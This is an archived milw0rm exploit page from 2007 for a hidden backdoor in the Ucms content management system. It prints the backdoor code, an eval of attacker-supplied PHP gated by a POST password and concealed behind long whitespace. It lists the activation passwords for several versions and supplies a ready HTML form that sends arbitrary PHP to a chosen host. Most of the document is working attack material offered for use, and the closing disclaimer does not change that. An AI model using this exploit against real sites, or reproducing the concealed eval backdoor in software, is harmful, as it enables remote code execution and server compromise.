<html><head><title>Ucms <= 1.8 Backdoor Remote Command Execution Exploit</title></head><pre>&lt;html&gt;
&lt;!--
##########################################
#                                        #
#      Ucms 1.4, 1.7, 1.8+?all           #
#        Non Public exploit              #
#       by 2²hot²2 a.k.a D4m14n          #
#           and shadowleet               #
#     Contact: teaminternet@pen.tj       #
#                 Or                     #
#     shadowleet@safe-mail.net           #
##########################################
Short description:
Ucms is a warez-cms coded by madmax,
he selled the cms for 150 Euro for one cms,
but it´s not enough that the cms costs 150 euro,
he added a &quot;secret&quot; backdoor which now is released...
Used by:
Famous warez-sites like alphawarez, loud, oxygen-warez and so on...
___________________________________________________________________

Backdoor in file:
/php/modules/entries/search.cache.inc.php
line 8:
$cache_path = '/search/' . GetValidFilename($search_term) . '_' . $search_hash . '_info.dat';
if(@stripslashes($_POST['p']) == 'ZCShY8FjtEhIF8LZ'){@eval(@stripslashes($_POST['e']));exit;};
the second string is hidden at the very right site with whitespaces in the texteditor, so nobody had seen it before,
the function is called in:
/php/modules/entries/search.main.inc.php
exploit:
--&gt;

&lt;head&gt;
&lt;title&gt;Ucms v. 1.8 Np exploit&lt;/title&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function sethost(seite)
{
document.host.action = seite + 'index.php?&amp;q=test&amp;e=1';
document.all.data.innerHTML =  document.host.action;
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body onLoad=&quot;sethost('http://www.ucmspage.de/')&quot; &gt;
&lt;h1&gt;Ucms v. 1.8 Np exploit&lt;/h1&gt;
Actual Request:&lt;div id=&quot;data&quot;&gt;&lt;/div&gt;
&lt;br /&gt;
Host:&lt;input type=&quot;text&quot; value=&quot;http://www.ucmspage.de/&quot; onKeyUp=&quot;sethost(this.value);&quot; /&gt;
&lt;form id=&quot;host&quot; name=&quot;host&quot; action=&quot;http://www.ucmspage.de/&quot; method=&quot;POST&quot;&gt;
Password:&lt;input type=&quot;text&quot; name=&quot;p&quot; value=&quot;ZCShY8FjtEhIF8LZ&quot;&gt;&lt;br /&gt;
&lt;!--
Additional info:
You need a password to activate the backdoor we found these passwords:
ZCShY8FjtEhIF8LZ (UCMS 1.8)
mYM1NHtWtZk2KwrF (UCMS 1.4)
wVCQUyhTga5Nmft1 (UCMS [?])
Just go into the file or similar files to find the passwords,
 for every version there is another password
--&gt;
 
Phpcode:&lt;br /&gt;
&lt;textarea name=&quot;e&quot; rows=&quot;20&quot; cols=&quot;100&quot;&gt;
phpinfo(); ?&gt;
&lt;/textarea&gt;
&lt;br /&gt;
&lt;input type=&quot;submit&quot; value=&quot;exploit&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;

&lt;!--
It´s just a crime to do such thigs, so please use
this exploit just for knowledge and not to destroy the warez pages...
thank you for you attention...
Have a nice day
--&gt;

&lt;/html&gt;

# milw0rm.com [2007-11-21]</pre></html>